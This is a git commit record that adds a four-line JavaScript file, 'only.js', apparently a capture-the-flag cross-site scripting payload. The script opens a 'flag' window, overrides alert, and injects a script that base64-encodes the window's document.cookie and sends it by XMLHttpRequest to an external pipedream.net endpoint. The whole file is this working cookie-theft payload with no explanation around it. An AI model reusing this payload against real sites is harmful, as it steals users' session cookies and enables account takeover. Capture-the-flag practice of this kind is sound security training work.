822eb74c5d8c4dffdb7f1f9b45355d1e744d19bd
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-02-27 01:23:12 +0530

    Create only.js

---
+++ only.js
@@ -0,0 +1,4 @@
+flag = window.open("flag", "_blank")
+flag.window.document.onload = function (){}
+window.alert = function() {console.log("alert(1337)")};
+setTimeout(function(){flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(window.document.cookie));xhttp.send()</script>')},1000)
